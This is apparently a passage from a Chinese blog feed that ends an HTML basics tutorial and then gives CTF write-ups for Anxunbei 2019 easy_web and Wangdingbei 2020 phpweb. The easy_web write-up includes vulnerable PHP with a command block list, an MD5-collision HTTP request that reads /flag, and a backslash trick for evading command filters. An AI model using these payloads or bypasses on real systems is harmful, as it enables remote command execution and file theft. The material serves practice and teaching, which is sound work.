class="headerlink" title="HTML表格table"></a>HTML表格table</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="comment">&lt;!--这是表格的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="comment">&lt;!--表头--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="comment">&lt;!--table head--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>外语<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="comment">&lt;!--table body--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--同样是table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--table data--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span>  </span><br></pre></td></tr></table></figure><table>    <head>        <tr>            <th>语文</th>            <th>数学</th>            <th>外语</th>        </tr>    </head>    <body>        <tr>            <td>100</td>            <td>100</td>            <td>100</td>        </tr>    </body> </table><h3 id="HTML表单form"><a href="#HTML表单form" class="headerlink" title="HTML表单form"></a>HTML表单form</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;form.js&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><form action = "form.js" method="post">        <div>            <label>username</label>            <input type="text" name="username" placeholder="Enter your username">        </div>        <div>            <label>password</label>            <input type="password" name="password" placeholder="Enter your password">        </div>        <input type="submit" name="submit" value="submit">    </form><h3 id="强调与加粗"><a href="#强调与加粗" class="headerlink" title="&lt;em&gt;&lt;/em&gt;强调与&lt;strong&gt;&lt;/strong&gt;加粗"></a><code>&lt;em&gt;&lt;/em&gt;</code>强调与<code>&lt;strong&gt;&lt;/strong&gt;</code>加粗</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  这杯液体<span class="tag">&lt;<span class="name">strong</span>&gt;</span>毒性很大<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>——如果饮用了它，你<span class="tag">&lt;<span class="name">strong</span></span></span><br><span class="line"><span class="tag">    &gt;</span>可能<span class="tag">&lt;<span class="name">em</span>&gt;</span>会死<span class="tag">&lt;/<span class="name">em</span>&gt;</span>&lt;/strong</span><br><span class="line">  &gt;。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><p>  这杯液体<strong>毒性很大</strong>——如果饮用了它，你<strong    >可能<em>会死</em></strong  >。</p><h3 id="在html中嵌入多媒体"><a href="#在html中嵌入多媒体" class="headerlink" title="在html中嵌入多媒体"></a>在html中嵌入多媒体</h3><h4 id="图片"><a href="#图片" class="headerlink" title="图片:"></a>图片:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/example.jpg&quot;</span> /&gt;</span></span><br><span class="line">可选图片描述或尺寸:</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">alt</span>=<span class="string">&quot;this is a picture!&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">with</span>=<span class="string">&quot;123&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">&quot;456&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="音频与视频"><a href="#音频与视频" class="headerlink" title="音频与视频:"></a>音频与视频:</h4><p>直接嵌入一段视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据用户所能支持的格式播放对应的视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;example.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注:</p><ol><li><code>&lt;p&gt;</code>标签中的内容只有在视频无法显示时才会出现</li><li>controls 使得用户可以操控视频 例如拖动进度条等</li></ol><p>对于音频,只需要把<code>&lt;video&gt;&lt;/video&gt;</code>标签改为<code>&lt;audio&gt;&lt;/audio&gt;</code>并嵌入音频路径即可</p><h3 id="块级元素与内联元素"><a href="#块级元素与内联元素" class="headerlink" title="块级元素&lt;div&gt;与内联元素&lt;span&gt;"></a>块级元素<code>&lt;div&gt;</code>与内联元素<code>&lt;span&gt;</code></h3><p>简单理解块级与内联:</p><p>块级元素会独占一行   如: <code>&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</code></p><p>内联元素不会独占一行 如: <code> &lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</code></p><p><code>&lt;div&gt;与&lt;span&gt;</code>并没有实际意义,而是与css一同使用时为整体或部分文本设置样式与属性</p><h2 id="HTML脚本"><a href="#HTML脚本" class="headerlink" title="HTML脚本"></a>HTML脚本</h2><p>内联嵌入<code>javascript</code>客户端脚本:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Hello World!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span>抱歉，你的浏览器不支持 JavaScript!<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过src引入:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML基础&quot;&gt;&lt;a href=&quot;#HTML基础&quot; class=&quot;headerlink&quot; title=&quot;HTML基础&quot;&gt;&lt;/a&gt;HTML基础&lt;/h1&gt;&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="语言基础" scheme="http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="HTML" scheme="http://example.com/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>强网杯 2019 高明的黑客</title>
    <link href="http://example.com/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <id>http://example.com/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</id>
    <published>2024-01-19T12:42:18.000Z</published>
    <updated>2024-01-20T13:42:09.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>按照提示下载了备份文件,里面存了一大堆php木马</p><p>但是仔细观察发现大部分都要么不能运行,要么没什么实际功能</p><p>看了wp,发现此题是考验python脚本编写能力,即检索出能够利用的php文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;强网杯-2019-高明的黑客&quot;&gt;&lt;a href=&quot;#强网杯-2019-高明的黑客&quot; class=&quot;headerlink&quot; title=&quot;[强网杯 2019]高明的黑客&quot;&gt;&lt;/a&gt;[强网杯 2019]高明的黑客&lt;/h1&gt;&lt;p&gt;按照提示下载了备份文件,里面存了一大堆p</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <link href="http://example.com/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/"/>
    <id>http://example.com/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</id>
    <published>2024-01-14T12:38:14.000Z</published>
    <updated>2024-01-14T13:19:25.337Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure><p>这个位置很容易想到任意文件读取,不过文件名应该经过了某种编码或加密</p><p>经过尝试,<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>两次base64一次字符串转16进制得到<code>555.png</code></p><p>构造payload读取<code>index.php</code>源码</p><p>payload:</p><p>&#x2F;index.php?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</p><p>将得到的回包中的base64码解码得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>主要考察md5强碰撞</p><p><a href="https://blog.51cto.com/u_14601424/6258344">浅谈md5弱类型比较和强碰撞</a></p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=sort%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=l\s</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;b<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><p>sort &#x2F;flag<br>flag{aeaa3aba-1fc0-49bf-83bb-bb67d58acb5a}</p><p>这里没有过滤sort,当然,也可以使用<code>\</code>来绕过对命令的过滤,如<code>ca\t /flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安洵杯-2019-easy-web&quot;&gt;&lt;a href=&quot;#安洵杯-2019-easy-web&quot; class=&quot;headerlink&quot; title=&quot;[安洵杯 2019]easy_web&quot;&gt;&lt;/a&gt;[安洵杯 2019]easy_web&lt;/h1&gt;&lt;figure cla</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="php md5强碰撞" scheme="http://example.com/tags/php-md5%E5%BC%BA%E7%A2%B0%E6%92%9E/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb</title>
    <link href="http://example.com/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/"/>
    <id>http://example.com/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</id>
    <published>2024-01-14T11:21:27.000Z</published>
    <updated>2024-01-14T11:40:20.741Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>aaaa</p><p>进去之后有一个date()的报错,然后不断刷新</p><p>容易发现这个date函数是由传入的func的值确认的</p><p>但是将func改为其他函数如system等则会回显Hacker</p><p>尝试读取源码</p><p>post传参: func&#x3D;highlight_file&amp;p&#x3D;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;phpweb&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat;</span><br><span class="line">            background-size: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">    <span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span 